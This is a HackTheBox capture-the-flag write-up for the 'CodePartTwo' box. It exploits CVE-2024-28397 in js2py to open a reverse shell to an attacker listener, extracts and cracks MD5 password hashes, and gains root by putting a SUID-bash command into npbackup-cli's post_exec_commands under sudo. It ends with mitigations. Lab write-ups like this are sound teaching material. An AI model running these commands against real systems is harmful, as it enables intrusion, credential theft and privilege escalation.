---
title: "CodePartTwo - HackTheBox Writeup"
date: 2026-01-28 00:00:00 +0000
categories: [boxes]
tags: [hackthebox, linux, cve-2024-28397, js2py, rce, privilege-escalation, sudo-abuse, ctf, easy]
image:
  path: /assets/img/box/2/logo.png
  alt: CodePartTwo HackTheBox Machine
---

![Machine Info](https://img.shields.io/badge/Difficulty-Easy-green) ![Machine Info](https://img.shields.io/badge/OS-Linux-blue)

---

**Difficulty:** Easy  
**OS:** Linux (Ubuntu)  
**Author:** al3xx

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Initial Foothold](#initial-foothold)
4. [Privilege Escalation - User](#privilege-escalation---user)
5. [Privilege Escalation - Root](#privilege-escalation---root)
6. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Nmap Scan

Starting with an nmap scan to identify open ports and running services:

```bash
sudo nmap -sC -sV 10.129.232.59 -oN scan
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings:**

- SSH service on port 22 (OpenSSH 8.2p1)
- Web application on port 8000 running Gunicorn 20.0.4
- Operating System: Ubuntu Linux

---

## Enumeration

### Web Application Analysis

Navigating to `http://10.129.232.59:8000`, we discover a web application titled "Welcome to CodePartTwo".

![Web Application Homepage](/assets/img/box/2/poc1.png)

The application features a **"Download App"** button that provides the source code for review - a classic code review challenge.

### Source Code Review

After downloading and analyzing the source code, a critical endpoint was identified:

```python
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

**Analysis:**

- The `/run_code` endpoint accepts POST requests with JavaScript code
- Uses `js2py.eval_js()` to evaluate the code
- Returns the result as JSON

### Testing the Endpoint

Testing with a simple JavaScript expression `2 + "2"`:

![JavaScript Execution Test](/assets/img/box/2/poc2.png)

The response confirms that the application executes JavaScript code server-side.

### Vulnerability Identification

Examining `requirements.txt` revealed a vulnerable dependency:

```
js2py==0.74
```

**Research findings:**

- js2py version 0.74 is vulnerable to **CVE-2024-28397**
- This vulnerability allows Remote Code Execution (RCE)
- The vulnerability exists even when `js2py.disable_pyimport()` is used

---

## Initial Foothold

### Exploiting CVE-2024-28397

Using a public exploit for CVE-2024-28397 to gain a reverse shell:

```bash
python3 exploit.py --target http://10.129.232.59:8000/run_code --lhost 10.10.14.143 --lport 4444
```

**Setting up the listener:**

```bash
python3 penelope.py
```

**Success!** A reverse shell was established as the `app` user:

```bash
app@codeparttwo:~/app/instance$ whoami
app
```

---

## Privilege Escalation - User

### Database Enumeration

Exploring the application directory revealed a SQLite database:

```bash
app@codeparttwo:~/app/instance$ ls
users.db
```

**Examining the database structure:**

```bash
sqlite3 users.db
sqlite> .tables
code_snippet  user
```

**Extracting user credentials:**

```bash
sqlite> SELECT * FROM user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

### Password Cracking

The hash `649c9d65a206a75f5abe509fe128bce5` appears to be MD5. Using a password cracking tool:

**Cracked password:** `sweetangelbabylove`

### Lateral Movement

Switching to the `marco` user:

```bash
su marco
Password: sweetangelbabylove
```

**User flag obtained:**

```bash
marco@codeparttwo:~$ cat user.txt
453d7544f5f05a11ebb2ced32393b8df
```

---

## Privilege Escalation - Root

### Sudo Privileges Enumeration

Checking sudo permissions for the `marco` user:

```bash
marco@codeparttwo:~$ sudo -l
User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

The user can run `/usr/local/bin/npbackup-cli` as root without a password.

### Binary Analysis

Examining the help menu:

```bash
sudo /usr/local/bin/npbackup-cli --help
```

**Key findings:**

```
optional arguments:
  -h, --help            show this help message and exit
  -c CONFIG_FILE, --config-file CONFIG_FILE
  -b, --backup          Run a backup
```

The binary accepts a custom configuration file via the `-c` flag.

### Configuration File Exploitation

Examining the default configuration:

```bash
marco@codeparttwo:~$ cat npbackup.conf | grep command
      stdin_from_command:
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      repo_password_command:
```

**Attack Vector:** The `post_exec_commands` array allows arbitrary command execution after backup operations.

### Creating Malicious Configuration

Copying and modifying the configuration file:

```bash
cp npbackup.conf /tmp/pwn.conf
vi /tmp/pwn.conf
```

**Modified configuration:**

```yaml
post_exec_commands:
  - cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
```

This command will:

1. Copy `/bin/bash` to `/tmp/rootbash`
2. Set the SUID bit (4755) on the binary

### Executing the Exploit

Running the backup with the malicious configuration:

```bash
sudo /usr/local/bin/npbackup-cli -c /tmp/pwn.conf -b
```

### Root Access

Executing the SUID bash binary:

```bash
marco@codeparttwo:~$ /tmp/rootbash -p
rootbash-5.0# whoami
root
```

**Root flag obtained:**

```bash
rootbash-5.0# cat /root/root.txt
0d0fda784485e30c55227dcbb22fd9b0
```

---

## Key Takeaways

### Vulnerabilities Exploited

1. **CVE-2024-28397 (js2py RCE)**
    
    - Outdated js2py version (0.74) allowed remote code execution
    - Mitigation: Update js2py to the latest patched version
2. **Weak Password Storage**
    
    - Passwords stored as unsalted MD5 hashes
    - Mitigation: Use strong hashing algorithms (bcrypt, Argon2) with proper salting
3. **Insecure Sudo Configuration**
    
    - User allowed to run backup utility with custom config as root
    - Mitigation: Restrict config file paths or validate config contents
4. **Command Injection via Configuration**
    
    - Backup utility executes arbitrary commands from config file
    - Mitigation: Sanitize or remove command execution features, or restrict to allowlisted commands

### Attack Path Summary

```
Nmap Scan → Web App Discovery → Source Code Download → 
CVE-2024-28397 Exploitation → Shell as 'app' → 
Database Credential Extraction → Password Cracking → 
Lateral Movement to 'marco' → User Flag → 
Sudo Abuse via npbackup-cli → SUID Bash → Root Flag
```

---

## Flags

- **User Flag:** `453d7544f5f05a11ebb2ced32393b8df`
- **Root Flag:** `0d0fda784485e30c55227dcbb22fd9b0`

---

**Author:** al3xx  
**Date:** January 28, 2026  
**Platform:** HackTheBox
